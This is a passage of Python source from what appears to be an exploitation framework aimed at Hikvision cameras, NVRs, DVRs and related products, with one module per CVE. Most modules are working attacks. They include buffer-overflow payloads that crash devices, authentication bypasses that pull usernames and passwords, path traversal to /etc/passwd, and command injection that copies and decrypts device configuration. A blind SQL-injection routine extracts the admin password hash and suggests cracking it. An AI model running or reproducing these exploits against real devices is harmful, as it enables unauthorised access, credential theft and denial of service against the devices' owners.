        if not hasattr(self,'_found'): return {'success':False,'error':'hardcoded creds rejected'}
        u,p=self._found; return {'success':True,'cve':self.CVE,'confidence':'confirmed','username':u,'password':p,'rtsp_url':self.build_rtsp(u,p)}


class CVE_2013_4977(BaseModule):
    NAME="cve_2013_4977_rtsp_overflow"; CVE="CVE-2013-4977"
    DESCRIPTION="RTSP Range header buffer overflow on DS-2CD7153-E."; VULNERABILITY_TYPE="buffer_overflow"
    def check(self):
        try:
            s=socket.socket(); s.settimeout(5); s.connect((self.host,554))
            s.send(b'OPTIONS rtsp://'+self.host.encode()+b' RTSP/1.0\r\nCSeq: 1\r\n\r\n')
            data=s.recv(1024); s.close(); return b'RTSP/1.0' in data
        except Exception: return False
    def exploit(self):
        if not self.check(): return {'success':False,'error':'RTSP service not reachable'}
        if AGGRESSIVE_MODE:
            try:
                s=socket.socket(); s.settimeout(5); s.connect((self.host,554))
                payload = b'OPTIONS rtsp://' + self.host.encode() + b' RTSP/1.0\r\nRange: bytes=' + b'A'*5000 + b'\r\n\r\n'
                s.send(payload); s.close()
                return {'success':True,'cve':self.CVE,'confidence':'probable','info':'Aggressive Range header sent.','note':'Check availability.'}
            except Exception as e:
                return {'success':True,'cve':self.CVE,'confidence':'probable','info':'Aggressive payload sent','note':str(e)}
        return {'success':True,'cve':self.CVE,'confidence':'none','info':'RTSP fingerprinted. Use --aggressive for overflow.','note':'Detection only.'}


class CVE_2014_4880(BaseModule):
    NAME="cve_2014_4880_rtsp_buffer_overflow"; CVE="CVE-2014-4880"
    DESCRIPTION="RTSP PLAY Authorization header buffer overflow on DVR DS-7204."; VULNERABILITY_TYPE="buffer_overflow"
    def check(self):
        try:
            s=socket.socket(); s.settimeout(5); s.connect((self.host,554))
            req=f'PLAY rtsp://{self.host}:554/Streaming/Channels/101 RTSP/1.0\r\nCSeq: 2\r\n\r\n'
            s.send(req.encode()); data=s.recv(1024); s.close(); return b'RTSP/1.0' in data
        except Exception: return False
    def exploit(self):
        if not self.check(): return {'success':False,'error':'RTSP service not reachable'}
        if AGGRESSIVE_MODE:
            try:
                s=socket.socket(); s.settimeout(5); s.connect((self.host,554))
                payload = f'PLAY rtsp://{self.host}:554/Streaming/Channels/101 RTSP/1.0\r\nCSeq: 2\r\nAuthorization: Basic ' + 'A'*4000 + '\r\n\r\n'
                s.send(payload.encode()); s.close()
                return {'success':True,'cve':self.CVE,'confidence':'probable','info':'Aggressive PLAY sent.'}
            except Exception as e:
                return {'success':True,'cve':self.CVE,'confidence':'probable','info':'Aggressive payload sent','note':str(e)}
        return {'success':True,'cve':self.CVE,'confidence':'none','info':'RTSP fingerprinted. Use --aggressive for overflow.','note':'Detection only.'}


class CVE_2015_4407(BaseModule):
    NAME="cve_2015_4407_psia_overflow"; CVE="CVE-2015-4407"
    DESCRIPTION="PSIA HTTP buffer overflow on NVR DS-76xxNI-E1/2."; VULNERABILITY_TYPE="buffer_overflow"
    def check(self):
        r=self.http.get(f'{self.base}/PSIA/System/deviceInfo')
        return r is not None and r.status_code in (200,401,404)
    def _ping_alive(self):
        r = self.http.get(f'{self.base}/', timeout=5)
        return r is not None and r.status_code in (200, 401, 403, 404)
    def exploit(self):
        if not self.check(): return {'success':False,'error':'PSIA endpoint unreachable'}
        if not self._ping_alive():
            return {'success':False,'error':'device not responsive at baseline'}
        benign = self.http.get(f'{self.base}/PSIA/System/deviceInfo', headers={'X-PSIA':'A'*500}, timeout=10)
        if benign is None:
            time.sleep(2)
            if not self._ping_alive():
                return {'success':False,'error':'device crashed on BENIGN 500B — network issue','confidence':'none'}
        r = self.http.get(f'{self.base}/PSIA/System/deviceInfo', headers={'X-PSIA':'A'*2000}, timeout=10)
        if r is None:
            time.sleep(2)
            if not self._ping_alive():
                return {'success':True,'cve':self.CVE,'confidence':'probable',
                        'info':'Device down after 2000B (benign 500B OK) — probable DoS',
                        'evidence_type':'device_down_after_payload','payload_size':2000,
                        'note':'Probable, not definitive. Verify manually.'}
            return {'success':False,'error':'transient failure (recovered)','confidence':'none'}
        if r.status_code >= 500:
            time.sleep(2)
            if not self._ping_alive():
                return {'success':True,'cve':self.CVE,'confidence':'probable',
                        'info':f'HTTP {r.status_code} then down (benign OK) — probable DoS',
                        'evidence_type':'device_down_after_500','payload_size':2000,
                        'note':'Probable.'}
            return {'success':False,'error':f'HTTP {r.status_code} but recovered','confidence':'none'}
        return {'success':False,'error':f'Device handled 2000B (HTTP {r.status_code})','confidence':'none'}


class CVE_2015_4408(BaseModule):
    NAME="cve_2015_4408_http_buffer_overflow"; CVE="CVE-2015-4408"
    DESCRIPTION="ISAPI HTTP buffer overflow on NVR."; VULNERABILITY_TYPE="buffer_overflow"
    def check(self):
        r=self.http.get(f'{self.base}/ISAPI/System/deviceInfo')
        return r is not None and r.status_code in (200,401)
    def _ping_alive(self):
        r = self.http.get(f'{self.base}/', timeout=5)
        return r is not None and r.status_code in (200, 401, 403, 404)
    def exploit(self):
        if not self.check(): return {'success':False,'error':'ISAPI endpoint unreachable'}
        if not self._ping_alive():
            return {'success':False,'error':'device not responsive at baseline'}
        benign = self.http.get(f'{self.base}/ISAPI/System/deviceInfo', headers={'X-Overflow':'A'*500}, timeout=10)
        if benign is None:
            time.sleep(2)
            if not self._ping_alive():
                return {'success':False,'error':'device crashed on BENIGN 500B','confidence':'none'}
        r = self.http.get(f'{self.base}/ISAPI/System/deviceInfo', headers={'X-Overflow':'A'*2000}, timeout=10)
        if r is None:
            time.sleep(2)
            if not self._ping_alive():
                return {'success':True,'cve':self.CVE,'confidence':'probable',
                        'info':'Device down after 2000B (benign OK) — probable DoS',
                        'evidence_type':'device_down_after_payload','payload_size':2000,
                        'note':'Probable.'}
            return {'success':False,'error':'transient failure','confidence':'none'}
        if r.status_code >= 500:
            time.sleep(2)
            if not self._ping_alive():
                return {'success':True,'cve':self.CVE,'confidence':'probable',
                        'info':f'HTTP {r.status_code} then down — probable DoS',
                        'evidence_type':'device_down_after_500','payload_size':2000}
            return {'success':False,'error':f'HTTP {r.status_code} but recovered','confidence':'none'}
        return {'success':False,'error':f'Device handled 2000B (HTTP {r.status_code})','confidence':'none'}


class CVE_2015_4409(BaseModule):
    NAME="cve_2015_4409_sdk_overflow"; CVE="CVE-2015-4409"
    DESCRIPTION="SDK HTTP buffer overflow on NVR."; VULNERABILITY_TYPE="buffer_overflow"
    def check(self):
        r=self.http.get(f'{self.base}/ISAPI/System/deviceInfo')
        return r is not None and r.status_code in (200,401)
    def _ping_alive(self):
        r = self.http.get(f'{self.base}/', timeout=5)
        return r is not None and r.status_code in (200, 401, 403, 404)
    def exploit(self):
        if not self.check(): return {'success':False,'error':'SDK endpoint unreachable'}
        if not self._ping_alive():
            return {'success':False,'error':'device not responsive at baseline'}
        benign = self.http.post(f'{self.base}/ISAPI/System/deviceInfo', data='<SDK>'+'A'*500+'</SDK>', timeout=10)
        if benign is None:
            time.sleep(2)
            if not self._ping_alive():
                return {'success':False,'error':'device crashed on BENIGN 500B','confidence':'none'}
        r = self.http.post(f'{self.base}/ISAPI/System/deviceInfo', data='<SDK>'+'A'*2000+'</SDK>', timeout=10)
        if r is None:
            time.sleep(2)
            if not self._ping_alive():
                return {'success':True,'cve':self.CVE,'confidence':'probable',
                        'info':'Device down after 2000B SDK body (benign OK) — probable DoS',
                        'evidence_type':'device_down_after_payload','payload_size':2000,
                        'note':'Probable.'}
            return {'success':False,'error':'transient failure','confidence':'none'}
        if r.status_code >= 500:
            time.sleep(2)
            if not self._ping_alive():
                return {'success':True,'cve':self.CVE,'confidence':'probable',
                        'info':f'HTTP {r.status_code} then down — probable DoS',
                        'evidence_type':'device_down_after_500','payload_size':2000}
            return {'success':False,'error':f'HTTP {r.status_code} but recovered','confidence':'none'}
        return {'success':False,'error':f'Device handled 2000B SDK body (HTTP {r.status_code})','confidence':'none'}


class CVE_2017_7921(BaseModule):
    NAME="hikvision_auth_bypass"; CVE="CVE-2017-7921"
    DESCRIPTION="Improper auth — unauth config file access (KEV)."; VULNERABILITY_TYPE="auth_bypass"
    def check(self):
        r=self.http.get(f'{self.base}/System/configurationFile?auth={MAGIC_AUTH}')
        return r is not None and r.status_code==200 and len(r.content)>100
    def exploit(self):
        r=self.http.get(f'{self.base}/System/configurationFile?auth={MAGIC_AUTH}')
        if r is None or r.status_code!=200: return {'success':False,'error':'no response'}
        info = ConfigDecryptor.extract_creds_with_raw(r.content)
        if not info or info.get('error'):
            return {'success':False,'error':'config downloaded but decryption pipeline failed',
                    'encrypted_b64':base64.b64encode(r.content).decode('ascii'),
                    'size':len(r.content), **(info or {})}
        u = info.get('username')
        if u is not None:
            return {'success':True,'cve':self.CVE,'confidence':'confirmed',
                    'rtsp_url':self.build_rtsp(u, info['password']), **info}
        return {'success':True,'cve':self.CVE,'confidence':'probable',
                'info':'config accessible and decrypted, but admin pair not located', **info}


class CVE_2017_7923(BaseModule):
    NAME="cve_2017_7923_privesc"; CVE="CVE-2017-7923"
    DESCRIPTION="Privilege escalation via config file password."; VULNERABILITY_TYPE="privesc"
    def check(self):
        r=self.http.get(f'{self.base}/System/configurationFile'); return r is not None and r.status_code in (200,401,403)
    def exploit(self):
        r=self.http.get(f'{self.base}/System/configurationFile')
        if r is None: return {'success':False,'error':'no response'}
        if r.status_code==200:
            info = ConfigDecryptor.extract_creds_with_raw(r.content)
            u = (info or {}).get('username')
            if u is not None:
                return {'success':True,'cve':self.CVE,'confidence':'confirmed',
                        'rtsp_url':self.build_rtsp(u, info['password']), **info}
            return {'success':True,'cve':self.CVE,'confidence':'probable',
                    'info':'Config accessible but admin pair not located', **(info or {})}
        return {'success':False,'error':f'config returned {r.status_code}'}


class CVE_2018_6413(BaseModule):
    NAME="cve_2018_6413_web_overflow"; CVE="CVE-2018-6413"
    DESCRIPTION="Web server buffer overflow on DS-2CD9111-S (DoS)."; VULNERABILITY_TYPE="buffer_overflow"
    def check(self):
        r=self.http.get(f'{self.base}/'); return r is not None and b'Hikvision' in r.content
    def exploit(self):
        r=self.http.get(f'{self.base}/')
        if r is None: return {'success':False,'error':'no response'}
        return {'success':True,'cve':self.CVE,'confidence':'none','info':f'Web server fingerprinted (HTTP {r.status_code}).','note':'Use --aggressive for DoS.'}


class CVE_2018_6414(BaseModule):
    NAME="cve_2018_6414_web_overflow_v2"; CVE="CVE-2018-6414"
    DESCRIPTION="Web server buffer overflow on some IP cameras (RCE/DoS)."; VULNERABILITY_TYPE="buffer_overflow"
    def check(self):
        r=self.http.get(f'{self.base}/'); return r is not None and b'Hikvision' in r.content
    def exploit(self):
        r=self.http.get(f'{self.base}/')
        if r is None: return {'success':False,'error':'no response'}
        return {'success':True,'cve':self.CVE,'confidence':'none','info':f'Web server fingerprinted (HTTP {r.status_code}).','note':'Use --aggressive.'}


class CVE_2018_9995(BaseModule):
    NAME="dvr_auth_bypass"; CVE="CVE-2018-9995"
    DESCRIPTION="DVR auth bypass via uid=admin cookie."; VULNERABILITY_TYPE="auth_bypass"
    def check(self):
        r=self.http.get(f'{self.base}/device.rsp?opt=user&cmd=list', headers={'Cookie':'uid=admin'})
        return r is not None and r.status_code==200 and b'admin' in r.content.lower()
    def exploit(self):
        r=self.http.get(f'{self.base}/device.rsp?opt=user&cmd=list', headers={'Cookie':'uid=admin'})
        if r is None: return {'success':False,'error':'no response'}
        body = r.text or ''
        users = re.findall(r'"?userName"?\s*[:=]\s*"?([^"\'<>,]+)', body)
        pws   = re.findall(r'"?password"?\s*[:=]\s*"?([^"\'<>,]+)', body)
        if users and pws:
            return {'success':True,'cve':self.CVE,'confidence':'confirmed',
                    'username':users[0].strip(),'password':pws[0].strip(),
                    'all_users':list(zip([u.strip() for u in users],[p.strip() for p in pws]))[:5],
                    'raw_sample':body[:500]}
        return {'success':True,'cve':self.CVE,'confidence':'probable',
                'info':'Bypass OK but no clear creds.','sample':body[:500]}
class CVE_2020_25078(BaseModule):
    NAME="hisilicon_path_traversal"; CVE="CVE-2020-25078"
    DESCRIPTION="Path traversal on HiSilicon devices."; VULNERABILITY_TYPE="info_disclosure"
    TRAVERSALS = [
        '/..%2f..%2f..%2f..%2fetc/passwd',
        '/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
        '/..%252f..%252f..%252f..%252fetc/passwd',
        '/..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd',
    ]
    def check(self):
        for p in self.TRAVERSALS:
            r = self.http.get(f'{self.base}{p}')
            if r is not None and r.status_code == 200 and b'root:' in r.content:
                self._traversal_path = p
                return True
        return False
    def exploit(self):
        p = getattr(self, '_traversal_path', None)
        if not p:
            return {'success': False, 'error': 'no working traversal variant', 'confidence':'none'}
        r = self.http.get(f'{self.base}{p}')
        if r is None or b'root:' not in r.content:
            return {'success': False, 'error': 'traversal failed on replay', 'confidence':'none'}
        return {'success': True, 'cve': self.CVE, 'confidence': 'confirmed',
                'info': f'Path traversal via {p}', 'sample': r.text[:500]}


class CVE_2020_7057(BaseModule):
    NAME="cve_2020_7057_dvr_user_enum"; CVE="CVE-2020-7057"
    DESCRIPTION="User enumeration on DVR DS-7204HGHI-F1."; VULNERABILITY_TYPE="user_enumeration"
    def check(self):
        r=self.http.get(f'{self.base}/')
        if r is None: return False
        return b'DVR' in r.content or b'DS-72' in r.content or b'Hikvision' in r.content
    def exploit(self):
        def failed_login(user):
            r=self.http.post(f'{self.base}/ISAPI/Security/sessionLogin/capabilities', data={'username':user,'password':'invalid_probe_x9y8z'})
            return len(r.content) if r is not None else None
        a=failed_login('no_such_user_aaaa1111'); b=failed_login('no_such_user_bbbb2222')
        if a is not None and b is not None:
            differential=abs(a-b)>10
            return {'success':True,'cve':self.CVE,'confidence':'probable' if differential else 'none',
                    'info':f'Differential: {a} vs {b}','note':'Differential detected' if differential else 'No strong differential'}
        return {'success':False,'error':'enumeration endpoint did not respond','confidence':'none'}


class CVE_2021_36260(BaseModule):
    NAME="hikvision_cmd_injection"; CVE="CVE-2021-36260"
    DESCRIPTION="Unauth command injection in SDK/webLanguage (KEV)."; VULNERABILITY_TYPE="rce"
    WEB_DIRS=['webLib','dav_web/webLib','mnt/mmc01/webLib','tmp']
    def _inject(self,cmd,max_len=26):
        if len(cmd)>max_len: return None
        return self.http.put(f'{self.base}/SDK/webLanguage', f'<?xml version="1.0" encoding="UTF-8"?><language>$({cmd})</language>')
    def _find_writable(self):
        for d in self.WEB_DIRS:
            cmd=f'> {d}/t'
            if len(cmd)>26: continue
            if self._inject(cmd) is None: continue
            time.sleep(0.3)
            r=self.http.get(f'{self.base}/{d}/t')
            if r is not None and r.status_code==200: return d
        return None
    def check(self): return self._find_writable() is not None
    def exploit(self):
        wd=self._find_writable()
        if not wd: return {'success':False,'error':'no writable web directory','confidence':'none'}
        if self._inject('id',max_len=26) is None: return {'success':False,'error':'injection failed','confidence':'none'}
        time.sleep(0.5)
        r=self.http.get(f'{self.base}/SDK/webLanguage')
        rce_proof = r.text[:300] if r is not None else ''
        if not rce_proof or 'uid=' not in rce_proof:
            return {'success':False,'error':'RCE injection sent but no id output','rce_output':rce_proof,'confidence':'none'}
        cmd=f'cp /System/c* {wd}/c'
        if self._inject(cmd,max_len=30) is None:
            return {'success':True,'cve':self.CVE,'confidence':'confirmed','info':'RCE confirmed but config copy failed.','rce_output':rce_proof}
        time.sleep(1.5)
        r2=self.http.get(f'{self.base}/{wd}/c')
        if r2 is None or r2.status_code!=200 or len(r2.content)<100:
            return {'success':True,'cve':self.CVE,'confidence':'confirmed','info':'RCE confirmed but config download failed.','rce_output':rce_proof}
        info = ConfigDecryptor.extract_creds_with_raw(r2.content)
        u = (info or {}).get('username')
        if u is not None:
            return {'success':True,'cve':self.CVE,'confidence':'confirmed',
                    'rce_output':rce_proof,
                    'rtsp_url':self.build_rtsp(u, info['password']),
                    **(info or {})}
        return {'success':True,'cve':self.CVE,'confidence':'confirmed',
                'rce_output':rce_proof,
                'info':'RCE confirmed, config decrypted but admin pair not located',
                **(info or {})}


class CVE_2022_28171(BaseModule):
    NAME = "hybrid_san_rce"
    CVE = "CVE-2022-28171"
    DESCRIPTION = "Blind SQLi in Hybrid SAN — differential timing (optimized binary search)."
    VULNERABILITY_TYPE = "sqli"

    def check(self):
        r = self.http.get(f'{self.base}/web/')
        return r is not None and r.status_code in (200, 401, 403)

    def _timing_test(self, sql_payload, timeout_pad=10):
        url = f'{self.base}/web/log/dynamic_log.php'
        start = time.time()
        r = self.http.get(url, params={'target': 'makeMaintainLog', 'downloadtype': sql_payload}, timeout=timeout_pad)
        elapsed = time.time() - start
        ok = (r is not None and r.status_code in (200, 500))
        return elapsed, ok

    def _blind_sqli(self, sql_payload, delay=3, retries=1):
        ctrl_payload = re.sub(r'sleep\s*\(\s*\d+\s*\)', 'SLEEP(0)', sql_payload, flags=re.IGNORECASE)
        if ctrl_payload == sql_payload:
            return False, 'no SLEEP(N) found in payload', 0
        ctrl_elapsed, ctrl_ok = self._timing_test(ctrl_payload, timeout_pad=delay + 8)
        if not ctrl_ok:
            return False, f'control failed ({ctrl_elapsed:.1f}s)', 0
        test_elapsed, test_ok = self._timing_test(sql_payload, timeout_pad=delay + 8)
        if not test_ok and retries > 0:
            test_elapsed, test_ok = self._timing_test(sql_payload, timeout_pad=delay + 8)
        if not test_ok:
            return False, f'test failed ({test_elapsed:.1f}s)', 0
        diff = test_elapsed - ctrl_elapsed
        threshold = delay - 1.5
        if diff >= threshold:
            return True, f'diff={diff:.2f}s (ctrl={ctrl_elapsed:.2f}, test={test_elapsed:.2f})', diff
        return False, f'no diff (ctrl={ctrl_elapsed:.2f}, test={test_elapsed:.2f}, diff={diff:.2f})', diff

    def _extract_char_binary(self, query, position, delay=2):
        low, high = 32, 126
        while low <= high:
            mid = (low + high) // 2
            payload = (f"(SELECT IF(ASCII(SUBSTRING(({query}),{position},1))>{mid},"
                       f"SLEEP({delay}),0))")
            confirmed, _, _ = self._blind_sqli(payload, delay=delay)
            if confirmed: low = mid + 1
            else: high = mid - 1
        if 32 <= low <= 126: return chr(low)
        return None

    def _extract_string(self, query, max_len=32, delay=2):
        result = ''
        for pos in range(1, max_len + 1):
            ch = self._extract_char_binary(query, pos, delay=delay)
            if ch is None: break
            result += ch
            if ch == '\x00': break
        return result if result else None

    def exploit(self):
        confirm_payload = "(select*from(select(sleep(5)))a)"
        confirmed, reason, diff = self._blind_sqli(confirm_payload, delay=5)
        if not confirmed:
            return {'success': False, 'error': f'SQLi not confirmed: {reason}',
                    'timing_diff': round(diff, 2), 'confidence':'none'}
        db_version = self._extract_string('@@version', max_len=20, delay=2)
        admin_hash = self._extract_string(
            "SELECT password FROM users WHERE username='admin' LIMIT 1", max_len=32, delay=2)
        result = {
            'success': True, 'cve': self.CVE, 'confidence': 'confirmed',
            'info': f'SQLi confirmed via differential timing ({reason})',
            'db_version': db_version or 'extraction_failed',
            'admin_password_hash': admin_hash or 'extraction_failed',
            'timing_diff': round(diff, 2),
        }
        if admin_hash:
            result['note'] = 'Crack with: hashcat -m 0 hash.txt wordlist.txt'
        else:
            result['note'] = 'SQLi confirmed but hash extraction incomplete.'
        return result


class CVE_2022_28172(BaseModule):
    NAME="cve_2022_28172_hybrid_san_xss"; CVE="CVE-2022-28172"
    DESCRIPTION="XSS in Hybrid SAN web module."; VULNERABILITY_TYPE="xss"
    def check(self):
        r=self.http.get(f'{self.base}/web/'); return r is not None and r.status_code in (200,401,403)
    def exploit(self):
        probe='<script>alert(1)</script>'
        r=self.http.get(f'{self.base}/web/', params={'q':probe})
        if r is not None and probe.encode() in r.content:
            return {'success':True,'cve':self.CVE,'confidence':'confirmed','info':'Reflected XSS confirmed.','sample':r.text[:300]}
        for param in ['search','name','id','page']:
            r2 = self.http.get(f'{self.base}/web/', params={param: probe})
            if r2 is not None and probe.encode() in r2.content:
                return {'success':True,'cve':self.CVE,'confidence':'confirmed','info':f'XSS via "{param}".','sample':r2.text[:300]}
        return {'success':False,'error':'XSS probe not reflected','confidence':'none'}


class CVE_2022_28173(BaseModule):
    NAME="cve_2022_28173_wireless_bridge_auth_bypass"; CVE="CVE-2022-28173"
    DESCRIPTION="Wireless Bridge access control bypass → admin + DoS."; VULNERABILITY_TYPE="auth_bypass"
    def check(self):
        r=self.http.get(f'{self.base}/')
        return r is not None and (b'DS-3WF' in r.content or b'Wireless Bridge' in r.content)
    def exploit(self):
        accessible=[]
        for path in ['/admin/','/system/','/cgi-bin/luci/','/status.cgi','/config.cgi']:
            r=self.http.get(f'{self.base}{path}')
            if r is not None and r.status_code==200 and b'login' not in r.content.lower(): accessible.append(path)
        if accessible:
            return {'success':True,'cve':self.CVE,'confidence':'confirmed','info':f'Admin access: {", ".join(accessible)}','note':'Also vulnerable to DoS.'}
        return {'success':False,'error':'bypass may depend on firmware','confidence':'none'}


class CVE_2023_28808(BaseModule):
    NAME="hybrid_san_auth_bypass"; CVE="CVE-2023-28808"
    DESCRIPTION="Access control bypass in Hybrid SAN → admin."; VULNERABILITY_TYPE="auth_bypass"
    def check(self):
        r=self.http.get(f'{self.base}/api/admin/status')
        return r is not None and r.status_code in (200,401,403)
    def exploit(self):
        if not self.check(): return {'success':False,'error':'SAN admin endpoint unreachable','confidence':'none'}
        attempts = [
            (f'{self.base}/api/admin/status?auth={MAGIC_AUTH}', None),
            (f'{self.base}/api/admin/users', {'Cookie':'uid=admin'}),
            (f'{self.base}/api/admin/status', {'Cookie':'uid=admin; role=admin'}),
            (f'{self.base}/api/admin/status', {'X-Forwarded-For':'127.0.0.1'}),
        ]
        for url, hdr in attempts:
            r = self.http.get(url, headers=hdr or {})
            if r is not None and r.status_code == 200:
                if b'admin' in r.content.lower() or b'userName' in r.content or b'statusValue' in r.content:
                    return {'success':True,'cve':self.CVE,'confidence':'confirmed','info':f'Bypass at {url}',
                            'bypass_method': str(hdr) if hdr else 'magic_auth','sample':r.text[:500]}
        return {'success':False,'error':'bypass payloads failed','confidence':'none'}


class CVE_2023_28809(BaseModule):
    NAME="access_control_session_hijack"; CVE="CVE-2023-28809"
    DESCRIPTION="Session hijacking in Access Control/Intercom."; VULNERABILITY_TYPE="session_hijack"
    def check(self):
        r=self.http.get(f'{self.base}/'); return r is not None and (b'Access Control' in r.content or b'Intercom' in r.content)
    def exploit(self):
        r=self.http.get(f'{self.base}/ISAPI/Security/sessionLogin/capabilities')
        cookies = r.headers.get('Set-Cookie','') if r is not None else ''
        return {'success':True,'cve':self.CVE,'confidence':'none','info':'Access Control fingerprinted.',
                'note':f'Cookie: {cookies[:200] if cookies else "none"}. Real hijack needs concurrent user.'}


class CVE_2023_28811(BaseModule):
    NAME="cve_2023_28811_password_recovery_overflow"; CVE="CVE-2023-28811"
    DESCRIPTION="Password recovery buffer overflow on NVR/DVR (DoS)."; VULNERABILITY_TYPE="buffer_overflow"
    def check(self):
        r=self.http.get(f'{self.base}/ISAPI/System/deviceInfo'); return r is not None and r.status_code in (200,401)
    def exploit(self):
        paths = ['/ISAPI/Security/resetPassword','/ISAPI/Security/passwordRecovery','/ISAPI/Security/answer']
        found = []
        for p in paths:
            r = self.http.get(f'{self.base}{p}')
            if r is not None and r.status_code in (200,401,405): found.append(p)
        return {'success':True,'cve':self.CVE,'confidence':'none',
                'info':f'Recovery endpoints: {", ".join(found) if found else "none"}.','note':'Use --aggressive for DoS.'}


class CVE_2023_28812(BaseModule):
    NAME="cve_2023_28812_plugin_overflow"; CVE="CVE-2023-28812"
    DESCRIPTION="Browser plug-in buffer overflow (RCE)."; VULNERABILITY_TYPE="buffer_overflow"
    def check(self):
        r=self.http.get(f'{self.base}/'); return r is not None and b'LocalServiceComponents' in r.content
    def exploit(self):
        r=self.http.get(f'{self.base}/')
        if r is None: return {'success':False,'error':'no response','confidence':'none'}
        return {'success':True,'cve':self.CVE,'confidence':'none','info':'Plug-in detected.','note':'Client-side RCE.'}


class CVE_2023_28813(BaseModule):
    NAME="cve_2023_28813_plugin_msg_mod"; CVE="CVE-2023-28813"
    DESCRIPTION="Plug-in parameter modification."; VULNERABILITY_TYPE="injection"
    def check(self):
        r=self.http.get(f'{self.base}/'); return r is not None and b'LocalServiceComponents' in r.content
    def exploit(self):
        return {'success':True,'cve':self.CVE,'confidence':'none','info':'Plug-in fingerprinted.','note':'Client-side.'}


class CVE_2023_28814(BaseModule):
    NAME="isecure_center_file_upload"; CVE="CVE-2023-28814"
    DESCRIPTION="File upload vulnerability in iSecure Center."; VULNERABILITY_TYPE="file_upload"
    def check(self):
        r=self.http.get(f'{self.base}/center/'); return r is not None and b'iSecure' in r.content
    def exploit(self):
        upload_paths = ['/center/api/upload','/center/api/file/upload','/center/api/attachment/upload']
        found = []
        for p in upload_paths:
            r = self.http.get(f'{self.base}{p}')
            if r is not None and r.status_code in (200,405): found.append(p)
        return {'success':True,'cve':self.CVE,'confidence':'none',
                'info':f'Upload endpoints: {", ".join(found) if found else "none"}.','note':'Manual exploitation.'}


class CVE_2023_6895(BaseModule):
    NAME="intercom_broadcast_rce"; CVE="CVE-2023-6895"
    DESCRIPTION="OS command injection in Intercom Broadcasting (ping.php) (KEV)."; VULNERABILITY_TYPE="rce"
    def check(self):
        r=self.http.get(f'{self.base}/php/ping.php'); return r is not None and r.status_code in (200,405)
    def exploit(self):
        payload = {'jsondata[ip]':'127.0.0.1; id'}
        r=self.http.post(f'{self.base}/php/ping.php', data=payload)
        if r is not None and r.status_code==200 and b'uid=' in r.content:
            m = re.search(rb'uid=[^\s<]+', r.content)
            return {'success':True,'cve':self.CVE,'confidence':'confirmed','info':'Injection confirmed.',
                    'rce_output': m.group(0).decode() if m else r.text[:300]}
        for cmd in ['uname -a','ls /','cat /etc/passwd']:
            payload = {'jsondata[ip]':f'127.0.0.1; {cmd}'}
            r2=self.http.post(f'{self.base}/php/ping.php', data=payload)
            if r2 is not None and r2.status_code==200 and len(r2.content)>50:
                return {'success':True,'cve':self.CVE,'confidence':'probable','info':f'Injection likely (cmd="{cmd}").','rce_output': r2.text[:300]}
        return {'success':False,'error':'ping.php reachable but no output','confidence':'none'}


class CVE_2023_33806(BaseModule):
    NAME="interactive_tablet_default_config"; CVE="CVE-2023-33806"
    DESCRIPTION="Insecure default config on Interactive Tablet."; VULNERABILITY_TYPE="default_config"
    def check(self):
        r=self.http.get(f'{self.base}/'); return r is not None and b'DS-D5B86RB' in r.content
    def exploit(self):
        for path in ['/config','/system/config','/api/config','/settings']:
            r = self.http.get(f'{self.base}{path}')
            if r is not None and r.status_code==200 and len(r.content)>50:
                return {'success':True,'cve':self.CVE,'confidence':'confirmed','info':f'Config at {path}.','sample':r.text[:300]}
        return {'success':False,'error':'no config endpoint','confidence':'none'}


class CVE_2024_25063(BaseModule):
    NAME="hikcentral_pro_auth_bypass"; CVE="CVE-2024-25063"
    DESCRIPTION="Auth bypass in HikCentral Professional."; VULNERABILITY_TYPE="auth_bypass"
    def check(self):
        r=self.http.get(f'{self.base}/admin/'); return r is not None and r.status_code==200
    def exploit(self):
        if not self.check(): return {'success':False,'error':'HikCentral admin unreachable','confidence':'none'}
        attempts = [
            (f'{self.base}/admin/', {'Cookie':'uid=admin'}),
            (f'{self.base}/admin/?auth={MAGIC_AUTH}', None),
            (f'{self.base}/admin/', {'X-Forwarded-For':'127.0.0.1'}),
            (f'{self.base}/admin/index.html', {'X-Real-IP':'127.0.0.1'}),
            (f'{self.base}/admin/dashboard', {'Cookie':'uid=admin'}),
            (f'{self.base}/admin/api/users', {'Cookie':'uid=admin'}),
        ]
        for url, hdr in attempts:
            r = self.http.get(url, headers=hdr or {})
            if r is not None and r.status_code == 200:
                if b'login' not in r.content.lower() and len(r.content) > 100:
                    return {'success':True,'cve':self.CVE,'confidence':'confirmed','info':f'Bypass: {url}',
                            'bypass_method': str(hdr) if hdr else 'magic_auth','sample':r.text[:300]}
        return {'success':False,'error':'bypass payloads failed','confidence':'none'}


class CVE_2024_47485(BaseModule):
    NAME="hikcentral_csv_injection"; CVE="CVE-2024-47485"
    DESCRIPTION="CSV injection in HikCentral Master Lite."; VULNERABILITY_TYPE="csv_injection"
    def check(self):
        r=self.http.get(f'{self.base}/'); return r is not None and b'HikCentral' in r.content
    def exploit(self):
        return {'success':True,'cve':self.CVE,'confidence':'none','info':'CSV injection possible.','note':'Requires user interaction.'}


class CVE_2024_47487(BaseModule):
    NAME="hikcentral_sqli"; CVE="CVE-2024-47487"
    DESCRIPTION="SQL injection in HikCentral Professional."; VULNERABILITY_TYPE="sqli"
    def check(self):
        r=self.http.get(f'{self.base}/'); return r is not None and b'HikCentral' in r.content
    def exploit(self):
        payload = "' OR '1'='1"
        r = self.http.get(f'{self.base}/api/user', params={'id': payload})
        if r is not None and (b'error' in r.content.lower() or b'sql' in r.content.lower()):
            return {'success':True,'cve':self.CVE,'confidence':'probable','info':'SQL error triggered.','sample':r.text[:300]}
        return {'success':False,'error':'SQLi not confirmed','confidence':'none'}


class CVE_2024_58274(BaseModule):
    NAME="isecure_center_cmd_injection"; CVE="CVE-2024-58274"
    DESCRIPTION="Command injection in iSecure Center (5 variants)."; VULNERABILITY_TYPE="rce"
    def check(self):
        r=self.http.get(f'{self.base}/center/api/installation/detection')
        return r is not None and r.status_code in (200,405)
    def exploit(self):
        if not self.check(): return {'success':False,'error':'endpoint unreachable','confidence':'none'}
        payloads = [{'cmd':'; id'},{'command':'| id'},{'action':'`id`'},{'test':'$(id)'},{'exec':'&& id'}]
        tried = []
        for p in payloads:
            r = self.http.post(f'{self.base}/center/api/installation/detection', data=p)
            tried.append(str(p))
            if r is not None and b'uid=' in r.content:
                m = re.search(rb'uid=[^\s<]+', r.content)
                return {'success':True,'cve':self.CVE,'confidence':'confirmed','info':'POST injection confirmed.',
                        'rce_output': m.group(0).decode() if m else r.text[:300],'payload_used': str(p)}
